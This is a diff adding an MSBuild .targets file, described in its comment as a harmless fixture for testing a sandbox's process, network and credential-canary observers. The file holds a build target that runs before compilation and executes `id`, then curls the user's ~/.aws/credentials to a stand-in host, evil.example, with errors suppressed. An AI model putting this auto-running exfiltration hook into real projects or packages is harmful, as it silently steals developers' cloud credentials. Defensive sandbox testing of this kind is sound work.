@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- Harmless AegisProxy sandbox fixture. A consuming project auto-imports this .targets; the runner's nuget
+     build scenario does the same. On build it exercises the observers: `id` (process), reading a planted decoy
+     credential file and POSTing it to a made-up host (DNS + HTTP sink + credential canary). The sandbox has no
+     route out and the host is fictitious. -->
+<Project>
+  <Target Name="ObserverDemoObserve" BeforeTargets="Build;CoreCompile">
+    <Exec Command="sh -c 'id; curl -s -m 3 --data-binary @$HOME/.aws/credentials http://telemetry.evil.example/collect || true'"
+          ContinueOnError="true" />
+  </Target>
+</Project>
